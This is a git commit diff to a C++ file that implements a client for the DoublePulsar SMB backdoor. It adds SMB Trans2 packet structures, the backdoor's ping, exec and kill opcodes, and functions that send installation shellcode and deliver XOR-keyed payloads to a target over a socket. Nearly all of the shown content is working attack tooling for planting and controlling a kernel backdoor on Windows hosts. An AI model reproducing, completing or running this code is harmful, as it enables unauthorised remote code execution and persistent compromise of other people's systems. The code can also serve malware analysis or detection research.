1a0b544d1b8e29da8a696135f5142640037bb989
bhassani <bhassani@users.noreply.github.com>
2021-09-07 16:19:22 -0500

    update functions

--- DoublePulsar_second_implementation.cpp
+++ DoublePulsar_second_implementation.cpp
@@ -4,6 +4,60 @@
 
 #pragma pack(push, 1)
 
+typedef struct _REQ_TRANSACTION_SECONDARY {
+	BYTE WordCount;
+	WORD TotalParameterCount;
+	WORD TotalDataCount;
+	WORD ParameterCount;
+	WORD ParameterOffset;
+	WORD ParameterDisplacement;
+	WORD DataCount;
+	WORD DataOffset;
+	WORD DataDisplacement;
+	WORD ByteCount;
+	BYTE Buffer[1];
+	//	UCHAR  Pad1[];
+	//	UCHAR  Trans_Parameters[ParameterCount];
+	//	UCHAR  Pad2[];
+	//	UCHAR  Trans_Data[DataCount];
+}REQ_TRANSACTION_SECONDARY, * PREQ_TRANSACTION_SECONDARY;
+
+typedef struct _REQ_TRANSACTION2 {
+	BYTE WordCount;
+	WORD TotalParameterCount;
+	WORD TotalDataCount;
+	WORD MaxParameterCount;
+	WORD MaxDataCount;
+	BYTE MaxSetupCount;
+	BYTE Reserved1;
+	WORD Flags;
+	DWORD Timeout;
+	WORD Reserved2;
+	WORD ParameterCount;
+	WORD ParameterOffset;
+	WORD DataCount;
+	WORD DataOffset;
+	BYTE SetupCount;
+	BYTE Reserved3;
+	BYTE Buffer[1];
+}REQ_TRANSACTION2, * PREQ_TRANSACTION2;
+
+
+typedef struct _RESP_TRANSACTION2 {
+	BYTE WordCount;
+	WORD TotalParameterCount;
+	WORD TotalDataCount;
+	WORD Reserved1;
+	WORD ParameterCount;
+	WORD ParameterOffset;
+	WORD ParameterDisplacement;
+	WORD DataCount;
+	WORD DataDisplacement;
+	BYTE SetupCount;
+	BYTE Reserved2;
+	BYTE Buffer[1];
+}RESP_TRANSACTION2, * PRESP_TRANSACTION2;
+
 typedef struct _REQ_TRANSACTION2_SECONDARY {
 	BYTE WordCount;
 	WORD TotalParameterCount;
@@ -27,7 +81,103 @@ typedef struct _REQ_TRANSACTION2_SECONDARY {
 #define SMB_COM_TRANS					0x25
 #define SMB_COM_TRANS_SECONDARY			0x26
 #define SMB_COM_TRANS2					0x32
-#define SMB_COM_TRANS2_SECONDARY
+
+//from smbmacros.h
+#define SMB_COM_TRANS2_SECONDARY		0x33
+#define NETBIOS_SIZE_OFFSET				2U
+#define SMB_HEADER_OFFSET				4U
+#define SMB_PARAM_OFFSET				36
+#define DOPU_PING_OPCODE				0x23
+#define DOPU_EXEC_OPCODE				0xC8
+#define DOPU_KILL_OPCODE				0x77
+
+#define DOPU_ERROR_SUCCESS				0x10
+#define DOPU_ERROR_ALLOCATION			0x30
+#define DOPU_ERROR_PARAMETERS			0x20
+
+#define SMB_FLAGS_LOCK_AND_READ_OK 0x01
+#define SMB_FLAGS_BUF_AVAIL 0x2
+#define SMB_FLAGS_CASE_INSENSITIVE 0x08
+#define SMB_FLAGS_CANONICALIZED_PATHS 0x10
+#define SMB_FLAGS_OPLOCK 0x20
+#define SMB_FLAGS_REPLY 0x80
+
+
+
+#define GetSocket(sockptr)		\
+*(SOCKET *)(sockptr)
+#define PutSocket(dest, value)	\
+*(SOCKET *)(dest) = (value)
+
+#define GetUshort(src)			\
+*(WORD *)(src)
+#define PutUshort(dst, val)		\
+*(WORD *)(dst) = (val)
+
+#define GetUlong(src)			\
+*(DWORD *)(src)
+#define PutUlong(dst, val)		\
+*(DWORD *)(dst) = (val)
+
+#define GetUlongPtr(src)		\
+*(DWORD_PTR*)(src)
+#define PutUlongPtr(dst, val)	\
+*(DWORD_PTR *)(dst) = (val)
+
+#define GetUlonglong(src)		\
+*(ULONGLONG*)(src)
+#define PutUlonglong(dest, value)	\
+*(ULONGLONG *)(dest) = (value)
+
+#define GetUnsigned(src)		\
+*(unsigned *)(src)
+#define PutUnsigned(dst, val)	\
+*(unsigned *)(dst) = (val)
+
+
+#define byteswap16(value)		\
+((WORD)((((value) >> 8) & 0xFF) | (((value) & 0xFF) << 8)))
+#define byteswap32(value)		\
+((((value) & 0xFF000000) >> 24) | (((value) & 0x00FF0000) >> 8) | (((value) & 0xFF00) << 8) | (((value) & 0xFF) << 24))
+#define byteswap64(value)		\
+((((value) & 0xFF00000000000000ULL) >> 56)		\
+|	(((value) & 0x00FF000000000000ULL) >> 40)	\
+|	(((value) & 0x0000FF0000000000ULL) >> 24)	\
+|	(((value) & 0x000000FF00000000ULL) >> 8)	\
+|	(((value) & 0x00000000FF000000ULL) << 8)	\
+|	(((value) & 0x0000000000FF0000ULL) << 24)	\
+|	(((value) & 0x000000000000FF00ULL) << 40)	\
+|	(((value) & 0x00000000000000FFULL) << 56))
+
+#define badsock(sfd)	\
+((BOOLEAN)((sfd) == INVALID_SOCKET) ? TRUE : FALSE)
+#define validsock(sfd)	\
+((BOOLEAN)((sfd) != INVALID_SOCKET) ? TRUE : FALSE)
+
+#define isnull(x)		\
+((BOOLEAN)((x) == NULL) ? TRUE : FALSE)
+#define notnull(x)		\
+((BOOLEAN)((x) != NULL) ? TRUE : FALSE)
+
+#define issockerr(status)	\
+((BOOLEAN)((status) == SOCKET_ERROR) ? TRUE : FALSE)
+
+#define MAKEUNSIGNED(x)		\
+((unsigned)(x))
+#define MAKEPBYTE(x)		\
+((PBYTE)(x))
+#define MAKEPSMB(x)			\
+((PSMB_HEADER)(x))
+#define MAKEPWSTR(x)		\
+((PWSTR)(x))
+#define MAKEPCWSTR(x)		\
+((PCWSTR)(x))
+#define MAKEPWORD(x)		\
+((WORD *)(x))
+#define MAKEPDWORD(x)		\
+((DWORD *)(x))
+#define MAKEPVOID(x)		\
+((PVOID)(x))
 
 
 DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request)
@@ -346,12 +496,253 @@ PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN m
 	return bws->pbdata;
 }
 
+unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status)
+{
+	status = 0;
+
+	if (badsock(s))
+		return MAKEUNSIGNED(WSAGetLastError());
+
+	*(int*)(&status) = send(s, (const char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
+	return status;
+}
+
+unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status)
+{
+	bwsalloc(bws, bufsize);
+
+	if (badsock(s))
+		return MAKEUNSIGNED(WSAGetLastError());
+
+	*(int*)(&status) = recv(s, (char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
+	return status;
+}
 
 
+BOOLEAN SendRecvTrans2SessionSetup(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
+{
+	static unsigned int sendsize[2], recvsize[2];
+	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
+	packet_creation_handler_type_one create_packet = &trans2_session_setup_packet;
+
+	if (isnull(outbound) || isnull(inbound) || isnull(info))
+		return FALSE;
+
+	if (badsock(s))
+		return FALSE;
+
+	if (isnull(create_packet))
+		return FALSE;
+
+	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
+		return FALSE;
+
+	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));
+
+	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
+		return FALSE;
+
+	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));
+
+	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
+		return FALSE;
+
+	bwsalloc(&tmp, GetUlong(recvsize));
+	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
+	bwsfree(client);
+
+	bwsalloc(client, tmp.dwsize);
+	cpy(client->pbdata, tmp.pbdata, client->dwsize);
+	bwsfree(&tmp);
+
+	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
+	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
+
+	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
+	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
+
+	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
+		return FALSE;
+
+	return TRUE;
+}
+
+BOOLEAN SendRecvDoublePulsarInstallationShellcode(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
+{
+	static unsigned int sendsize[2], recvsize[2];
+	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
+	packet_creation_handler_type_five create_packet = &doublepulsar_installation_shellcode;
+
+	if (isnull(outbound) || isnull(inbound) || isnull(info))
+		return FALSE;
+
+	if (badsock(s))
+		return FALSE;
+
+	if (isnull(create_packet))
+		return FALSE;
+
+	if (isnull(create_packet(srv)))
+		return FALSE;
+
+	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));
+
+	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
+		return FALSE;
+
+	inbound->ThisNetbiosSize = NULL, inbound->ThisSmb = NULL;
+	outbound->ThisNetbiosSize = NULL, outbound->ThisSmb = NULL;
+
+	return TRUE;
+}
+
+BOOLEAN SendRecvTrans2SessionSetupPing(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
+{
+	static unsigned int sendsize[2], recvsize[2];
+	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
+	packet_creation_handler_type_one create_packet = &trans2_session_setup_dopu_ping;
+
+	if (isnull(outbound) || isnull(inbound) || isnull(info))
+		return FALSE;
+
+	if (badsock(s))
+		return FALSE;
+
+	if (isnull(create_packet))
+		return FALSE;
+
+	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
+		return FALSE;
+
+	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));
+
+	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
+		return FALSE;
+
+	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));
+
+	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
+		return FALSE;
+
+	bwsalloc(&tmp, GetUlong(recvsize));
+	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
+	bwsfree(client);
+
+	bwsalloc(client, tmp.dwsize);
+	cpy(client->pbdata, tmp.pbdata, client->dwsize);
+	bwsfree(&tmp);
+
+	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
+	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
+
+	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
+	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
+
+	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
+		return FALSE;
+
+	return TRUE;
+}
+
+BOOLEAN SendRecvTrans2SessionSetupKill(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
+{
+	static unsigned int sendsize[2], recvsize[2];
+	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
+	packet_creation_handler_type_one create_packet = &trans2_session_setup_dopu_kill;
+
+	if (isnull(outbound) || isnull(inbound) || isnull(info))
+		return FALSE;
+
+	if (badsock(s))
+		return FALSE;
+
+	if (isnull(create_packet))
+		return FALSE;
+
+	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
+		return FALSE;
+
+	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));
+
+	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
+		return FALSE;
+
+	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));
+
+	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
+		return FALSE;
+
+	bwsalloc(&tmp, GetUlong(recvsize));
+	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
+	bwsfree(client);
+
+	bwsalloc(client, tmp.dwsize);
+	cpy(client->pbdata, tmp.pbdata, client->dwsize);
+	bwsfree(&tmp);
+
+	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
+	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
+
+	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
+	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
+
+	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
+		return FALSE;
+
+	return TRUE;
+}
 
 
+BOOLEAN SendRecvTrans2SessionSetupExec(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info, BUFFER IN* xorkeypacket, BUFFER IN* payload)
+{
+	static unsigned int sendsize[2], recvsize[2];
+	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
+	packet_creation_handler_type_six create_packet = &trans2_session_setup_dopu_exec;
 
+	if (isnull(outbound) || isnull(inbound) || isnull(info) || isnull(xorkeypacket) || isnull(payload))
+	{
+		SetLastError(STATUS_INVALID_PARAMETER);
+		return FALSE;
+	}
 
+	if (badsock(s))
+	{
+		SetLastError(((WSAGetLastError() != 0) ? WSAGetLastError() : STATUS_INVALID_PARAMETER));
+		return FALSE;
+	}
 
+	if (isnull(create_packet))
+	{
+		SetLastError(STATUS_INVALID_PARAMETER);
+		return FALSE;
+	}
 
+	if (isnull(create_packet(srv, xorkeypacket, payload, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
+	{
+		if (!GetLastError())
+			SetLastError(STATUS_FAIL);
+		return FALSE;
+	}
 
+	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));
+
+	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
+		return FALSE;
+
+	/*PutUnsigned(recvsize, RecvData(client, 0x1000, s, GetUnsigned(recvsize + 1)));
+	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
+		return FALSE;
+	bwsalloc(&tmp, GetUlong(recvsize));
+	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
+	bwsfree(client);
+	bwsalloc(client, tmp.dwsize);
+	cpy(client->pbdata, tmp.pbdata, client->dwsize);
+	bwsfree(&tmp);
+	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
+	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
+	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
+	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
+	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
+		return FALSE;*/
+	return TRUE;
+}
